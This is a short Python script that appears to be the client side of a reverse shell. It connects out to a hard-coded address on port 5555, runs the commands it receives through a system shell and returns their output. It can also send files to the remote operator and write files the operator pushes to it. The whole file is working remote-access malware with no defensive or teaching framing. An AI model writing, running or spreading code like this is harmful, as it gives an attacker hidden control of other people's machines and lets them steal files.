import socket
import time
import subprocess
import json
import os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def server_send(data):
        json_data = json.dumps(data)
        sock.send(json_data.encode())

def server_recv():
        data = ""
        while True:
                try:
                        data = data + sock.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue


def connection():
	host = "192.168.1.103"
	port = 5555

	while True:
		time.sleep(20)
		try:
			sock.connect((host, port))
			shell()
			sock.close
			break
		except:
			connection()

def upload_file(file_name):
	file = open(file_name, "rb")
	sock.send(file.read())

def download_file(file_name):
	file = open(file_name, "wb")
	sock.settimeout(1)
	chunk = sock.recv(1024)
	while chunk:
		file.write(chunk)
		try:
			chunk = sock.recv(1024)
		except socket.timeout as error:
			break
	sock.settimeout(None)
	file.close()

def shell():
	while True:
		command = server_recv()
		if command == "quit":
			break
		elif command[:3] == "cd ":
			os.chdir(command[3:])
		elif command[:8] == "download":
			upload_file(command[9:])
		elif command[:6] == "upload":
			download_file(command[7:])
		elif command == "clear":
			pass
		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			server_send(result)

connection()
